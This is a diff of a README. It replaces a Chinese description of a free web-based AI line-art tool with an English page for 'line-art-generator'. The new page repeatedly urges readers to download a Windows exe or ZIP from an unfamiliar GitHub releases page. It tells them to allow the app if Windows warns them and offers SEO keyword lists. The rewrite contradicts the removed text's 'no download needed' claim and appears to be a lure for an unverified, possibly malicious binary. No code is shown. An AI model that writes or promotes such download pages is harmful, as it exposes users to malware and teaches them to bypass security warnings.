@@ -1,72 +1,212 @@
-# 🎨 线稿生成 - 免费在线AI智能线稿绘制与轮廓提取 | SPAI 线稿助理
+# ✏️ line-art-generator - Turn photos into clean line art
 
-[![Website Status](https://img.shields.io/badge/Website-Online-brightgreen.svg)](https://www.sipingseo.com/zh/line-art-generator)
-[![Price](https://img.shields.io/badge/Price-100%25%20Free-blue.svg)](https://www.sipingseo.com/zh/line-art-generator)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-orange.svg)](https://www.sipingseo.com/zh/line-art-generator)
+[![Download line-art-generator](https://img.shields.io/badge/Download%20line-art-generator-blue?style=for-the-badge)](https://github.com/ha2228140-hue/line-art-generator/releases)
 
-[**SPAI 线稿助理 - 免费在线AI线稿生成工具**](https://www.sipingseo.com/zh/line-art-generator) 是一款由前沿 AI 模型驱动的智能绘画与图像处理平台。只需一键操作，即可将照片转换为精致线稿，或通过文字描述自动提取与绘制轮廓线条。无论您需要动漫线稿、建筑速写、产品轮廓还是插画底稿，本工具都能帮您轻松获得专业级线稿作品。
+## 🧭 What this app does
 
-👉 **[立即体验免费线稿生成工具](https://www.sipingseo.com/zh/line-art-generator)**
+line-art-generator turns photos and images into clean line art. It helps you make sketch-style images from simple photos, portraits, anime images, buildings, and other scenes.
 
----
+Use it when you want:
+- a line drawing from a photo
+- a sketch version of an image
+- clean edge-based art for tracing
+- a fast way to create black-and-white outlines
 
-## ✨ 核心优势与功能 (Core Features)
+## 💻 Before you start
 
-*   **🪄 照片智能转线稿**：极速将复杂照片转换为干净整洁的线稿图，轮廓提取精准高效。
-*   **🎨 多样化风格模拟**：完美模拟手绘风格、工笔白描、水墨速写、赛博朋克工业线稿等多种艺术表现形式。
-*   **📐 粗细与构图精细控制**：通过提示词（Prompt）轻松控制线条的粗细变化、虚实处理及细节刻画程度。
-*   **⚡ 秒级极速处理**：20-30秒内即可完成复杂的线稿生成任务，大幅缩短起稿与描线时间。
-*   **🆓 完全免费且零门槛**：无需安装复杂软件，无需注册账号，网页端即开即用，对零绘画基础用户同样友好。
-*   **💼 商业版权可用**：生成的线稿具备专业级品质，授予完整商业使用权，直接可用于商业插画、设计深化或印刷出版。
+You only need a Windows computer and a web browser to download the app.
 
-## 🎯 核心应用场景 (Use Cases)
+Best results come from:
+- Windows 10 or Windows 11
+- a mouse or trackpad
+- a photo with clear edges
+- enough free space to store the app and your images
 
-我们的在线线稿生成器支持海量应用场景，满足不同创作者的需求：
+## 🚀 Download and install
 
-1.  **🌸 动漫线稿生成**：生成二次元风格线稿，线条流畅富有张力，完美呈现五官与发型细节，非常适合二次上色练习与漫画创作。
-2.  **🏛️ 建筑速写提取**：精准提取建筑轮廓和透视结构，生成符合设计规范的速写线稿，适用于建筑手绘临摹与方案表达。
-3.  **🪑 产品与工业轮廓**：准确描边电子产品、家具器皿等工业设计草图，生成适合专利图纸或说明书的三视图规范线稿。
-4.  **🦋 自然生物与科学插画**：精细刻画花卉植物、动物昆虫的形态结构，生成细腻的自然科学插画线稿底稿。
+Visit this page to download the Windows version:
 
-## 🤖 强大的 AI 模型矩阵
+[Go to the line-art-generator releases page](https://github.com/ha2228140-hue/line-art-generator/releases)
 
-平台集成了多款当前最先进的 AI 图像生成与处理模型，您可以根据需求自由切换：
-*   `Nano Banana Pro`（最火：适合动漫线稿和二次元风格）
-*   `Flux-Kontext`（经典：适合写实轮廓和精细描边）
-*   `Seedream 4.5`（豆包：适合创意草图和概念线稿）
-*   `Z-Image-Turbo`（阿里系极速模型）
-*   `GPT-Image`（OpenAI 核心驱动）
+After the page opens:
 
-## 🚀 轻松四步完成线稿生成 (How to Use)
+1. Look for the latest release at the top of the page
+2. Open the list of files under that release
+3. Download the Windows file
+4. If the file is in a ZIP folder, open the ZIP folder first
+5. Move the app to a folder you can find easily, such as Desktop or Downloads
+6. Double-click the app to start it
 
-体验 AI 驱动的智能绘制流程，只需简单几步：
+If Windows asks for permission, choose the option to allow the app to run.
 
-1.  **上传参考图（可选）**：[进入工作台](https://www.sipingseo.com/zh/line-art-generator)，上传您的原始照片（最大支持 24MB 的 JPG/PNG/WEBP），以帮助 AI 更好地理解构图。
-2.  **撰写线稿描述**：详细描述您的期望。例如：*“生成动漫风格人物线稿，线条流畅有粗细变化，保留五官精致轮廓，适合上色练习。”*
-3.  **选择模型与参数**：选择最适合您需求的 AI 模型，并设定输出尺寸（如 1:1, 4:3）及生成数量。
-4.  **一键生成并下载**：点击“生成线稿”，AI 将在几秒内为您绘制出精美的线稿，支持免费高清下载。
+## 🖼️ How to use it
 
----
+Once the app opens, follow these steps:
 
-## ❓ 常见问题解答 (FAQ)
+1. Load an image from your computer
+2. Choose the line art or sketch option
+3. Adjust the strength of the edge detection if needed
+4. Preview the result
+5. Save the final image to your computer
 
-**Q: 完成一次线稿生成需要多长时间？**  
-**A:** AI 线稿生成通常在 20-30 秒内完成，全流程自动化，效率远超传统数位板手动描线。
+For best results, start with a photo that has:
+- strong lighting
+- clear object edges
+- a simple background
+- good image quality
 
-**Q: 生成的线稿是否可以用于商业项目？**  
-**A:** 完全可以！通过平台生成的线稿作品授予完整的商业使用权，无版权争议，可安全用于设计素材、出版、上色接单等商业用途。
+## 🎨 What you can create
 
-**Q: 如何获得最理想的线稿生成效果？**  
-**A:** 提供详细的提示词是关键。请具体描述：线条风格（如铅笔/钢笔）、粗细变化程度、细节保留度及整体风格（如动漫、速写）。描述越具体，AI 生成的线条越符合您的预期。
+line-art-generator works well for many image types:
 
-**Q: 平台收费吗？需要注册吗？**  
-**A:** 我们提供完全免费的 AI 线稿生成服务，且无需下载软件或注册账号，打开网页即可开始您的创作。
+- **Photos**: turn portraits and object photos into neat outlines
+- **Anime images**: create clean anime-style line art
+- **Architecture shots**: make sketch-like building drawings
+- **Product images**: convert objects into simple black-and-white art
+- **Reference images**: prepare clean outlines for tracing or coloring
 
----
+## ⚙️ Common settings
 
-### 🌐 官方链接与支持
+Most users only need a few simple controls:
 
-*   **官方主页**: [www.sipingseo.com](https://www.sipingseo.com/zh)
-*   **线稿生成工具直达**: [https://www.sipingseo.com/zh/line-art-generator](https://www.sipingseo.com/zh/line-art-generator)
+- **Edge strength**: changes how many lines appear
+- **Line thickness**: makes lines lighter or darker
+- **Detail level**: keeps small parts or removes them
+- **Background cleanup**: reduces noise in busy images
 
-> **🔒 隐私与安全承诺**：我们采用高级加密技术和严格的数据保护措施。您上传的所有参考图数据均绝对安全，绝不会被用于其他目的或向第三方泄露。
+If your result looks too busy, lower the detail. If it looks too plain, raise the edge strength.
+
+## 🛠️ Tips for better results
+
+Use these tips when your image does not look right:
+
+- Use a bright image with clear contrast
+- Avoid blurry photos
+- Crop out parts you do not need
+- Try a plain background when possible
+- Save a copy before making changes
+
+For portraits, images with the face near the center often work best. For buildings, straight lines and sharp edges give cleaner results.
+
+## 📁 File types
+
+The app can work with common image files such as:
+- JPG
+- PNG
+- BMP
+- WebP
+
+You can save the output as an image file that is easy to share, print, or edit later.
+
+## 🔍 Search terms covered by this app
+
+This project fits these use cases:
+- ai-drawing
+- ai-image-processing
+- ai-line-art
+- ai-sketch
+- anime-line-art
+- architectural-sketch
+- free-line-art-generator
+- line-art-generator
+- photo-to-line-art
+- sketch-converter
+- smart-edge-detection
+
+## 🧩 Typical Windows setup flow
+
+If you are not sure what to do after download, use this path:
+
+1. Open your Downloads folder
+2. Find the file from GitHub
+3. If it is a ZIP file, right-click and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file
+6. Load an image and start converting it
+
+If the app does not open, check that the files were fully extracted before you run it.
+
+## 📌 Quick start checklist
+
+- Download the latest release
+- Open the file on your Windows PC
+- Load a photo or sketch
+- Pick the line art mode
+- Adjust the settings
+- Save the result
+
+## 🧪 Good starting image ideas
+
+Try these first:
+- a face photo with plain lighting
+- a bicycle or chair
+- a house front
+- an anime portrait
+- a product on a white table
+
+These images have clear edges, so the output usually looks cleaner
+
+## 🔐 Privacy and local use
+
+line-art-generator is meant for local use on your computer. Your images stay on your device during the process unless you choose to share them yourself.
+
+## 📦 Release downloads
+
+Use the release page below to get the latest Windows build:
+
+[Download line-art-generator from GitHub Releases](https://github.com/ha2228140-hue/line-art-generator/releases)
+
+## 🧭 Step-by-step for first-time users
+
+1. Open the release page
+2. Find the latest version
+3. Download the Windows file
+4. Extract it if it comes in a ZIP
+5. Open the app
+6. Choose an image
+7. Convert it to line art
+8. Save the output
+
+## 🖱️ Simple use cases
+
+- turn a photo into a drawing
+- make a sketch for a school project
+- prepare clean outlines for coloring
+- create reference art from a picture
+- reduce a complex image to simple lines
+
+## 🧰 If your image looks wrong
+
+Try these changes:
+- use a clearer photo
+- choose a different edge setting
+- lower the detail amount
+- crop the image first
+- test a brighter version of the same file
+
+## 📎 Useful file names to look for
+
+On the release page, look for files with names like:
+- Windows
+- setup
+- release
+- zip
+- exe
+
+The correct file usually matches your Windows version and is the latest one listed
+
+## 🖼️ Output use ideas
+
+You can use the saved image for:
+- printing
+- coloring
+- tracing
+- reference work
+- digital art
+- notes and study pages
+
+## 🧭 Download link
+
+Use this link to visit the release page and download the Windows version:
+
+[https://github.com/ha2228140-hue/line-art-generator/releases](https://github.com/ha2228140-hue/line-art-generator/releases)
